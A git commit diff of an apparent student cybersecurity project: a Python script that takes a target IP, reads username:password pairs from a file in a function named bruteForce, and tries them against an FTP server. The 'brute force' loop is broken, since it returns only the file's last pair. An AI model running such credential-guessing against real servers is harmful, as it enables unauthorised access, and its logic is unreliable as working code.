88dd59725cfa94e9ec28e4bfa896cc94a12890ec
Joseph Roybal <39634437+JoeRoybal@users.noreply.github.com>
2020-11-23 08:34:54 -0600

    updated project to meet project 4 guidelines

--- main.py
+++ main.py
@@ -1,34 +1,35 @@
 """
-Cybersecurity Project #2
+Cybersecurity Project #4
 Author: Joe Roybal
-Date: 11/09/2020
+Date: 11/23/2020
 Goal: Access the ftp service on a Windows Server using the credentials [ anonymous : you@southwestern.edu ]
 """
 from ftplib import FTP
 
 
-def getUser():
-    return "anonymous"
-
-
-def getPass():
-    return "roybalj@southwestern.edu"
-
-
-def main():
+def FTPAttempt():
     print("Enter FTP IP address:")
-    target = raw_input()
+    target = raw_input()  # raw_input() if python 2 & input() for python 3
+    user, password = bruteForce("userPass.txt")
     ftp = FTP(target)
     try:
-        ftp.login(getUser(), getPass())
+        ftp.login(user, password)
         print("Success!")
     except:
         print("Login Failed")
     ftp.quit()
 
 
+def bruteForce(passwdFile):
+    pFile = open(passwdFile, 'r')
+    for line in pFile.readlines():
+        username = line.split(':')[0]
+        password = line.split(':')[1].strip('\r').strip('\n')
+    return username, password
+
+
 if __name__ == "__main__":
-    main()
+    FTPAttempt()
 
 
 """
